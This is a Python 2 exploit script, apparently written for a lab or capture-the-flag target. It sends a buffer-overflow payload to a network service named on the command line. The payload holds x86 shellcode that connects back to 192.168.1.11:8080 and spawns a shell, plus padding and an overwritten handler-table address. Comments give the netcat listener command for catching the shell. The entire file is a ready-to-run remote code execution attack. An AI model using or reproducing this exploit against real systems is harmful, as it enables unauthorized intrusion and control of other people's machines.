#!/usr/bin/env python2

import socket
import os
import time
import sys

if len(sys.argv) != 3:
	print "[-] Syntax: ./sploit.py <ip_victime> <port>"
	sys.exit(1)

try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((sys.argv[1], int(sys.argv[2])))
except:
   print "[-] Error connexion"
   sys.exit(1)

# connect back 192.168.1.11:8080
# nc -l -vvv -p 8080
shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
            "\x5b\x5e\x68\xc0\xa8\x01\x0b\x66\x68\x1f\x90\x66\x53\x6a\x10" \
            "\x51\x50\x89\xe1\x43\x6a\x66\x58\xcd\x80\x59\x87\xd9\xb0\x3f" \
            "\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
            "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

password    = shellcode
size        = len(shellcode)
password   += "\x90" * (512 - size - 8)
guestBook   = "A" * 512
handlerTab  = "\x80\xac\x04\x08" # tab[-1]
cmdID       = "1"

arg2        = str(len(guestBook) + len(password) + len(handlerTab) + 1)
payload     = cmdID + " " + arg2 + guestBook + password + handlerTab

print "[+] Try to send payload"
try:
   s.send(payload)
   s.close
except:
   print "[-] Error send payload1"
   sys.exit(1)

print "[+] binary backdoored in handlerTab[-2]"
sys.exit(0)
